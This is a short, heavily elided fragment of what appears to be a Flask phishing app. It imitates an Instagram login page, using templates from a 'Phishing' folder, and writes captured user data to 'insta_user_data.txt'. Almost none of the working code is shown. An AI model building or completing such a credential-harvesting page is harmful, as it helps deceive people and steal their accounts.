...
app = Flask(__name__, template_folder='Phishing/templates/instagram')
...
def login():
    ...
    file_path = os.path.join(current_path, 'insta_user_data.txt')
...
@app.route("/info")
def infa():
    return render_template('Insgagram/insta.html')
